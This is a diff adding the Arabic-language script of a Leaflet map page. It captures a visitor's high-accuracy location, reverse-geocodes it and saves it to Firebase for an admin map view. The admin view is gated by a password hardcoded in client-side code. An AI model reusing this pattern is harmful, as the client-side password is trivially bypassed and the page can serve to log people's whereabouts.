+        // أزرار تحكم الخريطة
+        const standardBtn = document.getElementById('standardBtn');
+        const satelliteBtn = document.getElementById('satelliteBtn');
+        const detailedBtn = document.getElementById('detailedBtn');
+        
+        let map;
+        let marker;
+        let currentLayer = 'standard';
+        let currentPosition = null;
+        let watchId = null;
+        
+        // مركز افتراضي
+        const defaultCenter = [30.0444, 31.2357];
+        
+        // طبقات الخرائط
+        const standardLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
+            minZoom: 6,
+            maxZoom: 20
+        });
+        
+        const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+            attribution: 'Tiles &copy; Esri',
+            minZoom: 6,
+            maxZoom: 20
+        });
+        
+        const detailedLayer = L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png', {
+            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
+            minZoom: 6,
+            maxZoom: 20
+        });
+
+        // كلمة المرور الصحيحة
+        const correctPassword = "ibrahim";
+
+        // إظهار صفحة محددة
+        function showPage(pageName) {
+            // إخفاء جميع الصفحات
+            welcomePage.style.display = 'none';
+            dataPage.style.display = 'none';
+            passwordPage.style.display = 'none';
+            mapPage.style.display = 'none';
+            
+            // إظهار الصفحة المطلوبة
+            switch(pageName) {
+                case 'welcome':
+                    welcomePage.style.display = 'flex';
+                    break;
+                case 'data':
+                    dataPage.style.display = 'block';
+                    break;
+                case 'password':
+                    passwordPage.style.display = 'block';
+                    break;
+                case 'map':
+                    mapPage.style.display = 'block';
+                    if (!map) {
+                        initMap();
+                    }
+                    if (currentPosition) {
+                        updateMapWithCurrentPosition();
+                    }
+                    break;
+            }
+        }
+
+        // أحداث التنقل بين الصفحات
+        startBtn.addEventListener('click', function() {
+            console.log('🚀 بدء عملية تحديد الموقع...');
+            getCurrentLocation();
+        });
+
+        // التحقق من كلمة المرور
+        passwordBtn.addEventListener('click', function() {
+            const enteredPassword = passwordInput.value.trim();
+            
+            if (enteredPassword === correctPassword) {
+                showPage('map');
+            } else {
+                passwordError.style.display = 'block';
+                passwordInput.style.borderColor = '#ff6b6b';
+                setTimeout(() => {
+                    passwordError.style.display = 'none';
+                    passwordInput.style.borderColor = 'rgba(102, 126, 234, 0.2)';
+                }, 3000);
+            }
+        });
+
+        // السماح بالدخول بالضغط على Enter
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                passwordBtn.click();
+            }
+        });
+        
+        adminBtn.addEventListener('click', function() {
+            showPage('password');
+        });
+        
+        newLocationBtn.addEventListener('click', function() {
+            showPage('welcome');
+            // إيقاف مراقبة الموقع إذا كانت نشطة
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+        });
+        
+        backBtn.addEventListener('click', function() {
+            console.log('↩️ العودة للصفحة الرئيسية');
+            showPage('data');
+        });
+
+        // زر البحث عن موقع
+        searchBtn.addEventListener('click', function() {
+            const lat = parseFloat(latitudeInput.value);
+            const lng = parseFloat(longitudeInput.value);
+            
+            if (isNaN(lat) || isNaN(lng)) {
+                alert('⚠️ يرجى إدخال إحداثيات صحيحة');
+                return;
+            }
+            
+            if (lat < -90 || lat > 90 || lng < -180 || lng > 180) {
+                alert('⚠️ يرجى إدخال إحداثيات ضمن النطاق الصحيح:\nخط العرض: -90 إلى 90\nخط الطول: -180 إلى 180');
+                return;
+            }
+            
+            // تحديث الخريطة بالإحداثيات الجديدة
+            updateMapWithCoordinates(lat, lng);
+        });
+        
+        // تهيئة الخريطة
+        function initMap() {
+            console.log('🗺️ جاري تهيئة الخريطة...');
+            try {
+                map = L.map('map', {
+                    center: defaultCenter,
+                    zoom: 7,
+                    zoomControl: true,
+                    preferCanvas: true
+                });
+                
+                // إضافة الطبقة الأساسية
+                standardLayer.addTo(map);
+                
+                // إضافة عناصر التحكم
+                L.control.scale({imperial: false}).addTo(map);
+                
+                console.log('✅ تم تهيئة الخريطة بنجاح');
+            } catch (error) {
+                console.error('❌ خطأ في تهيئة الخريطة:', error);
+                showError('حدث خطأ في تحميل الخريطة. يرجى تحديث الصفحة.');
+            }
+        }
+
+        // تحديد الموقع الحالي بدقة عالية
+        function getCurrentLocation() {
+            console.log('📍 جاري تحديد الموقع الحالي...');
+            resetUI();
+            loader.style.display = 'block';
+            welcomePage.style.display = 'none';
+            
+            if (!navigator.geolocation) {
+                showError('المتصفح الخاص بك لا يدعم تحديد الموقع الجغرافي.');
+                return;
+            }
+
+            // استخدام watchPosition للحصول على تحديثات مستمرة وتحسين الدقة
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 30000,
+                maximumAge: 0
+            };
+
+            watchId = navigator.geolocation.watchPosition(
+                function(position) {
+                    console.log('🎯 تم تحديث الموقع:', position.coords);
+                    loader.style.display = 'none';
+                    
+                    // إذا كانت هذه أول مرة أو كانت الدقة أفضل
+                    if (!currentPosition || position.coords.accuracy < currentPosition.coords.accuracy) {
+                        currentPosition = position;
+                        showPosition(position);
+                        
+                        // إذا كانت الدقة جيدة (أقل من 50 متر) نتوقف عن المراقبة
+                        if (position.coords.accuracy < 50) {
+                            navigator.geolocation.clearWatch(watchId);
+                            watchId = null;
+                            console.log('🛑 توقفت مراقبة الموقع - الدقة ممتازة');
+                        }
+                    }
+                },
+                function(error) {
+                    console.error('❌ خطأ في مراقبة الموقع:', error);
+                    // إذا فشلت المراقبة المستمرة، نستخدم getCurrentPosition كبديل
+                    navigator.geolocation.getCurrentPosition(
+                        showPosition,
+                        showError,
+                        options
+                    );
+                },
+                options
+            );
+
+            // إضافة مهلة للتوقف التلقائي بعد 30 ثانية
+            setTimeout(() => {
+                if (watchId) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                    console.log('⏰ انتهت مهلة مراقبة الموقع');
+                }
+            }, 30000);
+        }
+
+        // تحديث الخريطة بالإحداثيات المحددة
+        function updateMapWithCoordinates(lat, lng) {
+            if (!map) return;
+            
+            // تحديث مركز الخريطة
+            map.setView([lat, lng], 15);
+            
+            // إنشاء أو تحديث العلامة
+            if (!marker) {
+                createMarker(lat, lng);
+            } else {
+                marker.setLatLng([lat, lng]);
+            }
+            
+            // تحديث المعلومات
+            updateLocationInfo(lat, lng, 50);
+            getAddressForCoordinates(lat, lng);
+            
+            mapContainer.style.display = 'block';
+            locationInfo.style.display = 'block';
+            successMessage.style.display = 'block';
+        }
+        
+        // تحديث الخريطة مع الموقع الحالي
+        function updateMapWithCurrentPosition() {
+            if (!currentPosition || !map) return;
+            
+            const lat = currentPosition.coords.latitude;
+            const lng = currentPosition.coords.longitude;
+            const accuracy = currentPosition.coords.accuracy;
+            
+            updateMap(lat, lng, accuracy);
+            getAddressForCoordinates(lat, lng);
+        }
+        
+        // إضافة مستمعي الأحداث بعد تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('✅ تم تحميل الصفحة بنجاح');
+            retryBtn.addEventListener('click', getCurrentLocation);
+            
+            // أحداث أزرار نوع الخريطة
+            standardBtn.addEventListener('click', () => switchMapLayer('standard'));
+            satelliteBtn.addEventListener('click', () => switchMapLayer('satellite'));
+            detailedBtn.addEventListener('click', () => switchMapLayer('detailed'));
+        });
+        
+        async function showPosition(position) {
+            console.log('🎯 تم تحديد الموقع بنجاح:', position.coords);
+            loader.style.display = 'none';
+            currentPosition = position;
+            
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            // تحديث صفحة البيانات
+            updateDataPage(lat, lng, accuracy);
+            
+            // الحصول على العنوان وحفظ البيانات في Firebase
+            await getAddressAndSave(lat, lng, accuracy);
+            
+            // الانتقال لصفحة البيانات
+            showPage('data');
+        }
+
+        // تحديث صفحة البيانات
+        function updateDataPage(lat, lng, accuracy) {
+            console.log('📊 تحديث صفحة البيانات:', lat, lng, accuracy);
+            
+            // تحديث الإحداثيات
+            dataLatitude.textContent = lat.toFixed(6);
+            dataLongitude.textContent = lng.toFixed(6);
+            dataAccuracy.textContent = Math.round(accuracy);
+            
+            // تحديث مؤشر الدقة
+            const accuracyPercent = Math.max(10, Math.min(100, 100 - (accuracy / 2)));
+            dataAccuracyFill.style.width = `${accuracyPercent}%`;
+            dataAccuracyText.textContent = `${Math.round(accuracyPercent)}%`;
+            
+            // إضافة فئة للدقة بناءً على النسبة
+            if (accuracyPercent >= 80) {
+                dataAccuracyText.style.color = '#4CAF50';
+            } else if (accuracyPercent >= 60) {
+                dataAccuracyText.style.color = '#FF9800';
+            } else {
+                dataAccuracyText.style.color = '#F44336';
+            }
+        }
+
+        async function getAddressForCoordinates(lat, lng) {
+            console.log('🏠 جاري الحصول على العنوان للإحداثيات:', lat, lng);
+            addressElement.textContent = '🔄 جاري تحديد العنوان...';
+            resetLocationDetails();
+            
+            try {
+                const addressResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=ar`);
+                const addressData = await addressResponse.json();
+                
+                console.log('📨 بيانات العنوان المستلمة:', addressData);
+                
+                if (addressData && addressData.address) {
+                    processAddress(addressData);
+                } else {
+                    addressElement.textContent = `📍 الموقع: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                    updateDetail('country', 'غير معروف');
+                    updateDetail('city', 'غير معروف');
+                }
+            } catch (error) {
+                console.error('❌ خطأ في الحصول على العنوان:', error);
+                addressElement.textContent = `📍 الموقع: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                updateDetail('country', 'غير معروف');
+                updateDetail('city', 'غير معروف');
+            }
+        }
+        
+        async function getAddressAndSave(lat, lng, accuracy) {
+            console.log('💾 جاري حفظ البيانات:', lat, lng, accuracy);
+            dataAddress.textContent = '🔄 جاري تحديد العنوان...';
+            resetDataLocationDetails();
+            firebaseStatus.style.display = 'block';
+            firebaseStatus.className = 'firebase-status';
+            firebaseStatus.innerHTML = '<strong>📡 جاري حفظ البيانات في السحابة...</strong>';
+            
+            try {
+                // الحصول على العنوان
+                const addressResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=ar`);
+                const addressData = await addressResponse.json();
+                
+                let fullAddress = '';
+                let addressDetails = {};
+                
+                if (addressData && addressData.address) {
+                    processDataAddress(addressData);
+                    fullAddress = addressData.display_name;
+                    addressDetails = addressData.address;
+                } else {
+                    fullAddress = `الموقع: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                }
+                
+                // تجهيز البيانات للحفظ
+                const locationData = {
+                    latitude: lat,
+                    longitude: lng,
+                    accuracy: Math.round(accuracy),
+                    address: fullAddress,
+                    addressDetails: addressDetails
+                };
+                
+                // حفظ البيانات في Firebase
+                const saveResult = await window.saveLocationToFirebase(locationData);
+                
+                if (saveResult.success) {
+                    firebaseStatus.innerHTML = '<strong>✅ تم حفظ البيانات في السحابة بنجاح</strong>';
+                    firebaseStatus.className = 'firebase-status firebase-success';
+                    
+                    // تحديث العداد
+                    const totalLocations = document.getElementById('totalLocations');
+                    totalLocations.textContent = parseInt(totalLocations.textContent) + 1;
+                } else {
+                    firebaseStatus.innerHTML = `<strong>⚠️ تم تحديد الموقع ولكن حدث خطأ في حفظ البيانات</strong>`;
+                    firebaseStatus.className = 'firebase-status firebase-error';
+                }
+            } catch (error) {
+                console.error('❌ خطأ في حفظ البيانات:', error);
+                dataAddress.textContent = `📍 الموقع: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                updateDataDetail('dataCountry', 'غير معروف');
+                updateDataDetail('dataCity', 'غير معروف');
+                
+                firebaseStatus.innerHTML = '<strong>❌ حدث خطأ في حفظ البيانات</strong>';
+                firebaseStatus.className = 'firebase-status firebase-error';
+            }
+        }
+        
+        function updateLocationInfo(lat, lng, accuracy) {
+            console.log('📍 تحديث معلومات الموقع:', lat, lng, accuracy);
+            
+            // تحديث الإحداثيات
+            document.getElementById('latitude').textContent = lat.toFixed(6);
+            document.getElementById('longitude').textContent = lng.toFixed(6);
+            document.getElementById('accuracy').textContent = Math.round(accuracy);
+            
+            // تحديث مؤشر الدقة
+            const accuracyPercent = Math.max(10, Math.min(100, 100 - (accuracy / 2)));
+            accuracyFill.style.width = `${accuracyPercent}%`;
+            accuracyText.textContent = `${Math.round(accuracyPercent)}%`;
+            
+            // إضافة فئة للدقة بناءً على النسبة
+            if (accuracyPercent >= 80) {
+                accuracyText.style.color = '#4CAF50';
+            } else if (accuracyPercent >= 60) {
+                accuracyText.style.color = '#FF9800';
+            } else {
+                accuracyText.style.color = '#F44336';
+            }
+        }
+        
+        function updateMap(lat, lng, accuracy) {
+            console.log('🗺️ تحديث الخريطة:', lat, lng, accuracy);
+            
+            // تحديث مركز الخريطة
+            map.setView([lat, lng], 15);
+            
+            // إنشاء أو تحديث العلامة
+            if (!marker) {
+                createMarker(lat, lng);
+            } else {
+                marker.setLatLng([lat, lng]);
+            }
+            
+            // تحديث دائرة الدقة
+            updateAccuracyCircle(lat, lng, accuracy);
+            
+            mapContainer.style.display = 'block';
+            locationInfo.style.display = 'block';
+        }
+        
+        function createMarker(lat, lng) {
+            console.log('📍 إنشاء علامة جديدة:', lat, lng);
+            
+            // إنشاء علامة مخصصة
+            const customIcon = L.divIcon({
+                className: 'custom-marker',
+                html: '<div style="width:20px;height:20px;border-radius:50%;background:linear-gradient(135deg, #667eea, #764ba2);border:3px solid white;box-shadow:0 4px 15px rgba(102,126,234,0.4);"></div>',
+                iconSize: [26, 26],
+                iconAnchor: [13, 13]
+            });
+            
+            marker = L.marker([lat, lng], {icon: customIcon})
+                .addTo(map)
+                .bindPopup(`
+                    <div style="text-align:center;padding:10px;">
+                        <strong style="color: #667eea;">موقعك الحالي</strong><br>
+                        <small>${lat.toFixed(6)}, ${lng.toFixed(6)}</small>
+                    </div>
+                `)
+                .openPopup();
+        }
+        
+        function updateAccuracyCircle(lat, lng, accuracy) {
+            console.log('🎯 تحديث دائرة الدقة:', accuracy);
+            
+            if (window.accuracyCircle) {
+                map.removeLayer(window.accuracyCircle);
+            }
+            
+            window.accuracyCircle = L.circle([lat, lng], {
+                color: '#667eea',
+                fillColor: '#667eea',
+                fillOpacity: 0.1,
+                weight: 2,
+                radius: accuracy
+            }).addTo(map);
+        }
+        
+        function processAddress(data) {
+            console.log('🏠 معالجة بيانات العنوان:', data);
+            
+            const addr = data.address;
+            
+            // معالجة البيانات
+            let fullAddress = '';
+            const country = addr.country || 'غير معروف';
+            const city = addr.city || addr.town || addr.village || addr.municipality || 'غير معروف';
+            const district = addr.suburb || addr.neighbourhood || addr.city_district || '--';
+            const road = addr.road || addr.footway || '--';
+            
+            // بناء العنوان الكامل
+            if (road && road !== '--') fullAddress += road + '، ';
+            if (district && district !== '--') fullAddress += district + '، ';
+            if (city && city !== 'غير معروف') fullAddress += city + '، ';
+            fullAddress += country;
+            
+            addressElement.textContent = fullAddress || data.display_name;
+            
+            // تحديث التفاصيل
+            updateDetail('country', country);
+            updateDetail('city', city);
+            updateDetail('district', district);
+            updateDetail('road', road);
+        }
+        
+        function processDataAddress(data) {
+            console.log('🏠 معالجة بيانات العنوان للصفحة:', data);
+            
+            const addr = data.address;
+            
+            // معالجة البيانات
+            let fullAddress = '';
+            const country = addr.country || 'غير معروف';
+            const city = addr.city || addr.town || addr.village || addr.municipality || 'غير معروف';
+            const district = addr.suburb || addr.neighbourhood || addr.city_district || '--';
+            const road = addr.road || addr.footway || '--';
+            
+            // بناء العنوان الكامل
+            if (road && road !== '--') fullAddress += road + '، ';
+            if (district && district !== '--') fullAddress += district + '، ';
+            if (city && city !== 'غير معروف') fullAddress += city + '، ';
+            fullAddress += country;
+            
+            dataAddress.textContent = fullAddress || data.display_name;
+            
+            // تحديث التفاصيل
+            updateDataDetail('dataCountry', country);
+            updateDataDetail('dataCity', city);
+            updateDataDetail('dataDistrict', district);
+            updateDataDetail('dataRoad', road);
+        }
+        
+        function updateDetail(elementId, value) {
+            const element = document.querySelector(`#${elementId} span`);
+            if (element && value && value !== '--' && value !== 'غير معروف') {
+                element.textContent = value;
+            } else if (element) {
+                element.textContent = '--';
+            }
+        }
+        
+        function updateDataDetail(elementId, value) {
+            const element = document.querySelector(`#${elementId} span`);
+            if (element && value && value !== '--' && value !== 'غير معروف') {
+                element.textContent = value;
+            } else if (element) {
+                element.textContent = '--';
+            }
+        }
+        
+        function resetLocationDetails() {
+            document.querySelectorAll('.detail-item span').forEach(span => {
+                span.textContent = '--';
+            });
+        }
+        
+        function resetDataLocationDetails() {
+            document.querySelectorAll('#dataPage .detail-item span').forEach(span => {
+                span.textContent = '--';
+            });
+        }
+        
+        function switchMapLayer(type) {
+            if (!map) return;
+            
+            // إزالة الطبقة الحالية
+            switch(currentLayer) {
+                case 'standard':
+                    map.removeLayer(standardLayer);
+                    break;
+                case 'satellite':
+                    map.removeLayer(satelliteLayer);
+                    break;
+                case 'detailed':
+                    map.removeLayer(detailedLayer);
+                    break;
+            }
+            
+            // إضافة الطبقة الجديدة
+            currentLayer = type;
+            switch(type) {
+                case 'standard':
+                    standardLayer.addTo(map);
+                    updateButtonActiveState(standardBtn);
+                    break;
+                case 'satellite':
+                    satelliteLayer.addTo(map);
+                    updateButtonActiveState(satelliteBtn);
+                    break;
+                case 'detailed':
+                    detailedLayer.addTo(map);
+                    updateButtonActiveState(detailedBtn);
+                    break;
+            }
+        }
+        
+        function updateButtonActiveState(activeBtn) {
+            [standardBtn, satelliteBtn, detailedBtn].forEach(btn => {
+                btn.classList.remove('active');
+            });
+            activeBtn.classList.add('active');
+        }
+        
+        function resetUI() {
+            loader.style.display = 'none';
+            mapContainer.style.display = 'none';
+            locationInfo.style.display = 'none';
+            errorDiv.style.display = 'none';
+            successMessage.style.display = 'none';
+            firebaseStatus.style.display = 'none';
+        }
+        
+        function showError(error) {
+            console.error('❌ خطأ في تحديد الموقع:', error);
+            loader.style.display = 'none';
+            
+            let message = 'حدث خطأ غير معروف أثناء محاولة تحديد موقعك.';
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = 'تم رفض طلب الوصول إلى الموقع. يرجى السماح بالوصول إلى الموقع الجغرافي في إعدادات المتصفح.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = 'معلومات الموقع غير متوفرة. يرجى التأكد من تشغيل خدمة الموقع على جهازك.';
+                    break;
+                case error.TIMEOUT:
+                    message = 'انتهت المهلة المحددة لطلب الموقع. يرجى المحاولة مرة أخرى في منطقة ذات إشارة أفضل.';
+                    break;
+            }
+            
+            errorMessage.textContent = message;
+            errorDiv.style.display = 'block';
+            showPage('welcome');
+        }
+    </script>
+</body>
+</html>
